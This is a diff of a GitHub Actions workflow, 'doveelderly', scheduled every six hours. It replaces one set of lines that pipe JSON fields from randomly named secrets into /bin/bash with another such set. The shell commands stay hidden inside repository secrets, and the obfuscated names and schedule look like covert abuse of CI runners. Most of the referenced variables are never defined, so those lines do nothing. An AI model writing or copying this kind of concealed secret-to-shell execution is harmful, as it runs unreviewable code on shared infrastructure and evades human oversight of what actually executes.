@@ -1,9 +1,9 @@
 name: doveelderly
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '5 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: doveelderly
         env:
-          ckbk01924: ${{ secrets.ckbk01924 }}
+          bnh912: ${{ secrets.bnh912 }}
         run: |
-          echo $ckbk01924 | jq -r .phy8351 | /bin/bash
-          echo $x9199 | jq -r .ydlbb348 | /bin/bash
-          echo $m00 | jq -r .evie666 | /bin/bash
-          echo $ytc858 | jq -r .zavq234 | /bin/bash
-          echo $cuqy118 | jq -r .yw8 | /bin/bash
-          echo $hjv52 | jq -r .n312 | /bin/bash
-          echo $xfwc83 | jq -r .tqk2 | /bin/bash
-          echo $bpi5 | jq -r .tl05503 | /bin/bash
-          echo $uvi4 | jq -r .cvopr7973 | /bin/bash
-          echo $ji2553 | jq -r .rvx491 | /bin/bash
-          echo $hxn87794 | jq -r .ozhx16173 | /bin/bash
+          echo $bnh912 | jq -r .spf6639 | /bin/bash
+          echo $fhfe4 | jq -r .r94 | /bin/bash
+          echo $kqtg29 | jq -r .hgwtx35 | /bin/bash
+          echo $ujqqj60 | jq -r .bi155 | /bin/bash
+          echo $awnjb361 | jq -r .t7884 | /bin/bash
+          echo $nd78 | jq -r .cqfbx73 | /bin/bash
+          echo $scfw1 | jq -r .eb1 | /bin/bash
 
